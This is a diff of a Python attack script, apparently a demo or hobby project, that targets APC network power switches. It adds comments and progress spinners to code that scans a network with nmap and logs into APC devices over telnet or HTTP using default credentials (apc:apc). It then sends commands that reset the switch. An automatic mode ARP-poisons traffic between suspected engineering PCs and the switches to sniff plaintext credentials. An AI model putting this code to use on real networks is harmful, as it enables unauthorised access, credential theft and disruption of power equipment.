@@ -5,17 +5,17 @@
 #Finish implementing spinners.
 #Automate MITM functionality????
 
-import requests
-from pyfiglet import Figlet
-import time
-import nmap
-import socket
-import re
-import os
-import random
-from halo import Halo
-from scapy.layers.l2 import ARP
-import netifaces
+import requests #for sending HTTP requests
+from pyfiglet import Figlet #pretty banners
+import time #sleep (zzz)
+import nmap #running network scans
+import socket #talking to telnet, telnetlib does not like apc telnet.
+import re #a little big of regex magic
+import os #clear the terminal!
+import random #random banners are stylish
+from halo import Halo #loading bars
+from scapy.layers.l2 import ARP #MITM attack
+import netifaces #get information about local interface
 
 def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
 def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
@@ -24,6 +24,7 @@ def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
 
 spinner = Halo(text_color='green',spinner='bouncingBar')
 
+#scan a specific IP for OS and ports. Requires elevated privilages.
 def recon(ip):
     nm = nmap.PortScanner()
     #prGreen('[*] Running active scan...')
@@ -41,6 +42,7 @@ def recon(ip):
         prGreen('[+] Product: '+host['scan'][ip]['tcp'][port]['product'])
         print('\n')
 
+#'exploit' telnet (run a bunch of commands to login and reset the switch)
 def exploit_telnet(ip, username,password):
     PORT = 23
 
@@ -57,14 +59,16 @@ def exploit_telnet(ip, username,password):
             return
         
         spinner.succeed()
-        prGreen('[+] Getting data from server...')
-
+        spinner.text=('[+] Getting data from server...')
+        spinner.start()
         res = s.recv(2048)
         res = res + s.recv(2048)
-        #time.sleep(1)
+        time.sleep(1)
         #print(res)
         if res==b'\xff\xfb\x01\n\rUser Name : ':
-            prGreen('[+] Sending username to socket...')
+            spinner.succeed()
+            spinner.text=('[+] Sending username to socket...')
+            spinner.start()
             time.sleep(1)
 
             for c in username:
@@ -72,14 +76,16 @@ def exploit_telnet(ip, username,password):
                 s.recv(100)
             s.sendall(b'\r')
             s.recv(100)
+            spinner.succeed()
 
-            prGreen('[+] Sending password to socket...')
+            spinner.text=('[+] Sending password to socket...')
+            spinner.start()
             time.sleep(1)
             for c in password:
                 s.sendall(c.encode('UTF-8'))
                 s.recv(100)
             s.sendall(b'\r')
-
+            spinner.succeed()
             full_res=b''
             time.sleep(1)
             while (1):
@@ -88,7 +94,9 @@ def exploit_telnet(ip, username,password):
                 full_res = full_res+res
                 #time.sleep(1)
                 if b'\r\n>' in res:
-                    prGreen('[+] Login successful (apc:apc)!!\n[+] Server sent back menu, sending commands to reset the switch...')
+                    prGreen('[+] Login successful (apc:apc)!!\n')
+                    spinner.text = ('[+] Server sent back menu, sending commands to reset the switch...')
+                    spinner.start()
                     time.sleep(2)
                     break
 
@@ -132,11 +140,13 @@ def exploit_telnet(ip, username,password):
                 full_res = full_res+res
                 time.sleep(1)
                 if b'Press <ENTER> to continue...' in res:
+                    spinner.succeed()
                     prGreen('[+] Reset successful... break anything good? :^)')
                     break    
 
         s.close()
 
+#'exploit' http (run a bunch of commands to login and reset the switch)
 def exploit_http(ip, username,password):
     #Logon
     data = {
@@ -172,6 +182,7 @@ def exploit_http(ip, username,password):
     if 'You are now logged off.' in response.text:
         prGreen('[+] Logged out.')
 
+#do the demo automatically by scanning the network, looking for potential APC devices and engineering PCs, then MITM them and search for creds, then reset the switch. this may never work. but if it does, it will be a neat little party trick that will impress lots of people. maybe even my dad.
 def automagic():
     #Scan for APC device
     nm = nmap.PortScanner()
@@ -181,7 +192,7 @@ def automagic():
     target = ip +"/"+str(cidr)
     spinner.text="Scanning "+target+" for APC devices with telnet(tcp/23) and HTTP(tcp/80) open..."
     spinner.start()
-    results = nm.scan(target,arguments='-p 23, 80')
+    results = nm.scan(target,arguments='-sV')
     #prGreen("[+] OS: "+results['scan']['ip']['osmatch'][0]['name'])
     spinner.succeed()
     apc_devices=list()
@@ -191,27 +202,32 @@ def automagic():
         for port in results['scan'][host]['tcp']:
             service = results['scan'][host]['tcp'][port]['name']
             product = results['scan'][host]['tcp'][port]['product']
+            print(results['scan'][host])
             prGreen("[+] Port: "+str(port))
             prGreen('[+] Service: '+service)
-            if port==23 and service=='telnet' and 'apc' in product:
+            if (port==23 or port==80) and (service=='telnet' or service=='http') and 'apc' in product:
                 apc_devices.append(host)
-            else: #TODO add more coniditions here to narrow it down
+            elif('windows' in service): #TODO add more coniditions here to narrow it down
                 eng_pcs.append(host)
 
-    prGreen("[+] Obtained the following APC device(s):")
-    for t in apc_devices:
-        prGreen("[+] "+t)
+    if (len(apc_devices)>0 and len(eng_pcs)>0):
+        prGreen("[+] Obtained the following APC device(s):")
+        for t in apc_devices:
+            prGreen("[+] "+t)
 
-    prGreen("[+] Obtained the following potential engineering PCs:")
-    for t in eng_pcs:
-        prGreen("[+] "+t)
+        prGreen("[+] Obtained the following potential engineering PCs:")
+        for t in eng_pcs:
+            prGreen("[+] "+t)
+        #if found, posison all ARP cahces for any traffic going it, then monitor for plain text credentials (telnet or http)
+        for apc in apc_devices:
+            for pc in eng_pcs:
+                ARP.arp_mitm(pc,apc)
+    else:
+        prRed('[-] No devices found, self destructing.')
+        return
 
-    for apc in apc_devices:
-        for pc in eng_pcs:
-            ARP.arp_mitm(pc,apc)
 
 
-    #if found, posison all ARP cahces for any traffic going it, then monitor for plain text credentials (telnet or http)
     apc_switch_ip=""
     victim_ip=""
     #ARP.arp_mitm(victim_ip,apc_switch_ip)
@@ -219,7 +235,7 @@ def automagic():
     
 
     
-
+#print that banner
 def print_banner():
     fonts = ['alligator','alligator2','basic','big','block','chunky','colossal','cosmic','epic','isometric1','larry3d']
     banner = Figlet(font=random.choice(fonts),width=1000)
